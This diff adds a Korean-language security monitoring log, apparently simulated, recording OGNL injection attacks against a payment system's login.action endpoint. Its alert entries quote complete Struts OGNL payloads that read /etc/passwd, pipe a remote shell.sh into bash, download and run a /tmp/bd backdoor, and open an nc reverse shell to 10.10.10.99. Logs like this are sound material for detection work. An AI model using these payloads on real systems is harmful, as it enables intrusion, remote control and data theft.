@@ -1,0 +1,45 @@
+[2026-03-19 09:01:23] OK: 이상 징후 없음.
+[2026-03-19 09:02:23] OK: 이상 징후 없음.
+[2026-03-19 09:03:23] [CRITICAL] OGNL 인젝션 탐지: 2건
+10.10.10.99 - - [19/Mar/2026:09:01:23 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('whoami'))}"
+10.10.10.99 - - [19/Mar/2026:09:03:15 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('id'))}"
+---
+[2026-03-19 09:04:23] OK: 이상 징후 없음.
+[2026-03-19 09:05:23] OK: 이상 징후 없음.
+[2026-03-19 09:06:23] [CRITICAL] OGNL 인젝션 탐지: 3건
+10.10.10.99 - - [19/Mar/2026:09:05:49 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('cat /etc/passwd'))}"
+10.10.10.99 - - [19/Mar/2026:09:07:55 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('uname -a'))}"
+10.10.10.99 - - [19/Mar/2026:09:10:02 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('ls /var/www/html'))}"
+---
+[2026-03-19 09:07:23] [WARNING] 500 Error Spike — IP: 10.10.10.99 (3회)
+[2026-03-19 09:08:23] [WARNING] Rapid Request — IP: 10.10.10.99 (11req/min)
+[2026-03-19 09:09:23] OK: 이상 징후 없음.
+[2026-03-19 09:10:23] OK: 이상 징후 없음.
+[2026-03-19 09:11:23] [CRITICAL] OGNL 인젝션 탐지: 5건
+10.10.10.99 - - [19/Mar/2026:09:10:02 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('ls /var/www/html'))}"
+10.10.10.99 - - [19/Mar/2026:09:12:08 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('curl http://10.10.10.99:4444/shell.sh|bash'))}"
+10.10.10.99 - - [19/Mar/2026:09:14:29 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('wget -O /tmp/bd http://10.10.10.99/backdoor'))}"
+10.10.10.99 - - [19/Mar/2026:09:16:44 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('chmod +x /tmp/bd && /tmp/bd'))}"
+10.10.10.99 - - [19/Mar/2026:09:19:03 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('nc -e /bin/bash 10.10.10.99 4444'))}"
+---
+[2026-03-19 09:12:23] [WARNING] 500 Error Spike — IP: 10.10.10.99 (7회)
+[2026-03-19 09:13:23] [WARNING] Rapid Request — IP: 10.10.10.99 (14req/min)
+[2026-03-19 09:14:23] [WARNING] Large Response Detected: 10.10.10.99 - - [19/Mar/2026:09:14:29 +0900] "GET /login.action HTTP/1.1" 500 1832
+[2026-03-19 09:15:23] [CRITICAL] /tmp 실행 파일 탐지:
+/tmp/bd
+---
+[2026-03-19 09:16:23] [CRITICAL] OGNL 인젝션 탐지: 8건
+10.10.10.99 - - [19/Mar/2026:09:19:03 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('nc -e /bin/bash 10.10.10.99 4444'))}"
+10.10.10.99 - - [19/Mar/2026:09:21:19 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('python3 -c import socket,subprocess,os'))}"
+10.10.10.99 - - [19/Mar/2026:09:23:39 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('crontab -l'))}"
+10.10.10.99 - - [19/Mar/2026:09:26:10 +0900] "GET /login.action HTTP/1.1" 500 1832 "-" "curl/7.88.1" Content-Type: "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=@java.lang.Runtime@getRuntime().exec('ps aux'))}"
+---
+[2026-03-19 09:17:23] [WARNING] 500 Error Spike — IP: 10.10.10.99 (12회)
+[2026-03-19 09:18:23] [WARNING] Rapid Request — IP: 10.10.10.99 (18req/min)
+[2026-03-19 09:19:23] [CRITICAL] /tmp 실행 파일 탐지:
+/tmp/bd
+---
+[2026-03-19 09:20:23] ALERT: 보안 이벤트 탐지 — /app/payment-system/logs/attack_alerts.log 확인 요망.
+[2026-03-19 09:21:23] ALERT: 보안 이벤트 탐지 — /app/payment-system/logs/attack_alerts.log 확인 요망.
+[2026-03-19 09:22:23] ALERT: 보안 이벤트 탐지 — /app/payment-system/logs/attack_alerts.log 확인 요망.
+[2026-03-19 09:23:23] ALERT: 보안 이벤트 탐지 — /app/payment-system/logs/attack_alerts.log 확인 요망.
